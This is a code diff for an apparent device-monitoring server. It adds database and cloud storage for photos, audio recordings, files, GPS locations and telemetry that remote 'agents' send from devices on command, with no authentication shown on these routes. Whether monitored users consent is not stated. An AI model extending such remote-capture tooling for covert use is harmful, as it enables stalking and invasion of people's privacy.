@@ -6,6 +6,17 @@ import commandsRoutes from './commands.routes';
 import authRoutes from '../auth/auth.routes';
 import presenceRoutes from '../presence/presence.routes';
 import storageRoutes from '../storage/storage.routes';
+import {
+  isMongoConnected,
+  DeviceModel,
+  LocationModel,
+  TelemetryModel,
+  PhotoModel,
+  AudioModel,
+  FileModel,
+} from '../database/mongo';
+import { r2Service } from '../storage/r2.service';
+import { logger } from '../logger';
 
 const router = Router();
 
@@ -30,6 +41,10 @@ router.get('/health', (_req, res) => {
   res.json({
     status: 'HEALTHY',
     version: 'v1',
+    storage: {
+      mongoConnected: isMongoConnected(),
+      r2Configured: r2Service.isConfigured(),
+    },
     timestamp: new Date().toISOString(),
   });
 });
@@ -71,24 +86,74 @@ router.get('/photos/command/:deviceId', (req, res) => {
   res.json({ command });
 });
 
-router.post('/photos/upload', (req, res) => {
+router.post('/photos/upload', async (req, res) => {
   const { deviceId, name, camera, base64 } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
-  const list = livePhotosStorage.get(devId) || [];
+  const photoId = `photo_${Date.now()}`;
+  const fileName = name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`;
+
+  let r2Key: string | undefined;
+  let r2Url: string | undefined;
+
+  // Upload to Cloudflare R2 if configured
+  if (base64 && r2Service.isConfigured()) {
+    try {
+      const buffer = Buffer.from(base64, 'base64');
+      r2Key = `photos/${devId}/${photoId}.jpg`;
+      const uploaded = await r2Service.uploadBuffer(r2Key, buffer, 'image/jpeg');
+      r2Url = uploaded.url;
+    } catch (err) {
+      logger.warn({ err }, 'R2 photo upload failed, falling back to database/memory');
+    }
+  }
+
   const newPhoto = {
-    id: `photo_${Date.now()}`,
-    name: name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`,
+    id: photoId,
+    name: fileName,
     date: 'Just now (Live Capture)',
     size: '4.8 MB',
+    r2Key,
+    r2Url,
     base64: base64 || null,
   };
+
+  // Persist in MongoDB if connected
+  if (isMongoConnected()) {
+    try {
+      await PhotoModel.create({
+        id: photoId,
+        deviceId: devId,
+        name: fileName,
+        date: newPhoto.date,
+        size: newPhoto.size,
+        r2Key,
+        r2Url,
+        base64: base64 || undefined,
+      });
+    } catch (err) {
+      logger.warn({ err }, 'MongoDB photo persistence error');
+    }
+  }
+
+  const list = livePhotosStorage.get(devId) || [];
   list.unshift(newPhoto);
   livePhotosStorage.set(devId, list);
   res.status(201).json({ success: true, photo: newPhoto });
 });
 
-router.get('/photos/list/:deviceId', (req, res) => {
+router.get('/photos/list/:deviceId', async (req, res) => {
   const devId = req.params.deviceId;
+
+  if (isMongoConnected()) {
+    try {
+      const dbPhotos = await PhotoModel.find({ deviceId: devId }).sort({ createdAt: -1 }).limit(50).lean();
+      if (dbPhotos.length > 0) {
+        res.json({ photos: dbPhotos });
+        return;
+      }
+    } catch (_) {}
+  }
+
   const photos = livePhotosStorage.get(devId) || [];
   res.json({ photos });
 });
@@ -112,25 +177,76 @@ router.get('/audio/command/:deviceId', (req, res) => {
   res.json({ duration });
 });
 
-router.post('/audio/upload', (req, res) => {
+router.post('/audio/upload', async (req, res) => {
   const { deviceId, name, duration, size, base64 } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
-  const list = liveAudioStorage.get(devId) || [];
+  const audioId = `audio_${Date.now()}`;
+  const audioName = name || `REC_${Date.now().toString().slice(-4)}.m4a`;
+
+  let r2Key: string | undefined;
+  let r2Url: string | undefined;
+
+  // Upload to Cloudflare R2 if configured
+  if (base64 && r2Service.isConfigured()) {
+    try {
+      const buffer = Buffer.from(base64, 'base64');
+      r2Key = `audio/${devId}/${audioId}.m4a`;
+      const uploaded = await r2Service.uploadBuffer(r2Key, buffer, 'audio/mp4');
+      r2Url = uploaded.url;
+    } catch (err) {
+      logger.warn({ err }, 'R2 audio upload failed, falling back to database/memory');
+    }
+  }
+
   const newAudio = {
-    id: `audio_${Date.now()}`,
-    name: name || `REC_${Date.now().toString().slice(-4)}.m4a`,
+    id: audioId,
+    name: audioName,
     duration: duration || '0:10',
     size: size || '160 KB',
     date: 'Just now',
+    r2Key,
+    r2Url,
     base64: base64 || null,
   };
+
+  // Persist in MongoDB if connected
+  if (isMongoConnected()) {
+    try {
+      await AudioModel.create({
+        id: audioId,
+        deviceId: devId,
+        name: audioName,
+        duration: newAudio.duration,
+        size: newAudio.size,
+        date: newAudio.date,
+        r2Key,
+        r2Url,
+        base64: base64 || undefined,
+      });
+    } catch (err) {
+      logger.warn({ err }, 'MongoDB audio persistence error');
+    }
+  }
+
+  const list = liveAudioStorage.get(devId) || [];
   list.unshift(newAudio);
   liveAudioStorage.set(devId, list);
   res.status(201).json({ success: true, audio: newAudio });
 });
 
-router.get('/audio/list/:deviceId', (req, res) => {
+router.get('/audio/list/:deviceId', async (req, res) => {
   const devId = req.params.deviceId;
+
+  if (isMongoConnected()) {
+    try {
+      const dbAudios = await AudioModel.find({ deviceId: devId }).sort({ createdAt: -1 }).limit(50).lean();
+      if (dbAudios.length > 0) {
+        res.json({ audioList: dbAudios });
+        return;
+      }
+    } catch (_) {}
+  }
+
   const audioList = liveAudioStorage.get(devId) || [];
   res.json({ audioList });
 });
@@ -138,7 +254,7 @@ router.get('/audio/list/:deviceId', (req, res) => {
 // Battery & Hardware Telemetry Hub
 export const liveBatteryTelemetry = new Map<string, any>();
 
-router.post('/battery/telemetry', (req, res) => {
+router.post('/battery/telemetry', async (req, res) => {
   const { deviceId, deviceName, percentage, level, isCharging, chargingStatus, temperature, voltage, health, technology, powerSave, networkType, networkStatus, uptime, wallpaper, hardware } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
   const existing = liveBatteryTelemetry.get(devId);
@@ -161,12 +277,44 @@ router.post('/battery/telemetry', (req, res) => {
     hardware: hardware || existing?.hardware || null,
     timestamp: Date.now()
   };
+
+  // Persist in MongoDB if connected
+  if (isMongoConnected()) {
+    try {
+      await TelemetryModel.create(data);
+      await DeviceModel.updateOne(
+        { deviceId: devId },
+        {
+          $set: {
+            deviceName: data.deviceName,
+            lastSeenAt: new Date(),
+            status: 'ONLINE',
+          }
+        },
+        { upsert: true }
+      );
+    } catch (err) {
+      logger.warn({ err }, 'MongoDB telemetry persistence error');
+    }
+  }
+
   liveBatteryTelemetry.set(devId, data);
   res.status(201).json({ success: true, telemetry: data });
 });
 
-router.get('/battery/:deviceId', (req, res) => {
+router.get('/battery/:deviceId', async (req, res) => {
   const devId = req.params.deviceId;
+
+  if (isMongoConnected()) {
+    try {
+      const dbTel = await TelemetryModel.findOne({ deviceId: devId }).sort({ createdAt: -1 }).lean();
+      if (dbTel) {
+        res.json({ telemetry: dbTel });
+        return;
+      }
+    } catch (_) {}
+  }
+
   let telemetry = liveBatteryTelemetry.get(devId);
   if (!telemetry) {
     for (const [k, v] of liveBatteryTelemetry.entries()) {
@@ -278,9 +426,18 @@ router.post('/files/download_request', (req, res) => {
   res.json({ success: true, message: 'Download requested from agent' });
 });
 
-router.post('/files/upload_content', (req, res) => {
+router.post('/files/upload_content', async (req, res) => {
   const { deviceId, path, name, size, base64, mimeType } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
+
+  if (base64 && r2Service.isConfigured()) {
+    try {
+      const buffer = Buffer.from(base64, 'base64');
+      const r2Key = `files/${devId}/${encodeURIComponent(name || 'file')}`;
+      await r2Service.uploadBuffer(r2Key, buffer, mimeType || 'application/octet-stream');
+    } catch (_) {}
+  }
+
   downloadedFilesStorage.set(`${devId}:${path}`, { path, name, size, base64, mimeType });
   res.json({ success: true });
 });
@@ -295,7 +452,7 @@ router.get('/files/content/:deviceId', (req, res) => {
 // Live Location & GPS Telemetry Hub
 const liveLocationStorage = new Map<string, any>();
 
-router.post('/location/sync', (req, res) => {
+router.post('/location/sync', async (req, res) => {
   const { deviceId, latitude, longitude, accuracy, altitude, speed, address, timestamp } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
   const parsedLat = typeof latitude === 'number' ? latitude : (parseFloat(latitude) || 22.5726);
@@ -314,12 +471,43 @@ router.post('/location/sync', (req, res) => {
     address: address || 'Live GPS Location',
     timestamp: timestamp || Date.now()
   };
+
+  // Persist in MongoDB if connected
+  if (isMongoConnected()) {
+    try {
+      await LocationModel.create(data);
+      await DeviceModel.updateOne(
+        { deviceId: devId },
+        {
+          $set: {
+            lastSeenAt: new Date(),
+            status: 'ONLINE',
+          }
+        },
+        { upsert: true }
+      );
+    } catch (err) {
+      logger.warn({ err }, 'MongoDB location persistence error');
+    }
+  }
+
   liveLocationStorage.set(devId, data);
   res.status(201).json({ success: true, location: data });
 });
 
-router.get('/location/:deviceId', (req, res) => {
+router.get('/location/:deviceId', async (req, res) => {
   const devId = req.params.deviceId;
+
+  if (isMongoConnected()) {
+    try {
+      const dbLoc = await LocationModel.findOne({ deviceId: devId }).sort({ createdAt: -1 }).lean();
+      if (dbLoc) {
+        res.json({ location: dbLoc });
+        return;
+      }
+    } catch (_) {}
+  }
+
   const location = liveLocationStorage.get(devId) || {
     deviceId: devId,
     latitude: 22.5726,
@@ -333,11 +521,35 @@ router.get('/location/:deviceId', (req, res) => {
   res.json({ location });
 });
 
-router.get('/location/all', (_req, res) => {
+router.get('/location/all', async (_req, res) => {
   const locations: Record<string, any> = {};
+
+  if (isMongoConnected()) {
+    try {
+      const recentLocations = await LocationModel.aggregate([
+        { $sort: { createdAt: -1 } },
+        {
+          $group: {
+            _id: '$deviceId',
+            latest: { $first: '$$ROOT' }
+          }
+        }
+      ]);
+      for (const item of recentLocations) {
+        if (item._id && item.latest) {
+          locations[item._id] = item.latest;
+        }
+      }
+    } catch (_) {}
+  }
+
+  // Fallback / merge with memory store
   liveLocationStorage.forEach((val, key) => {
-    locations[key] = val;
+    if (!locations[key]) {
+      locations[key] = val;
+    }
   });
+
   res.json({ locations });
 });
 
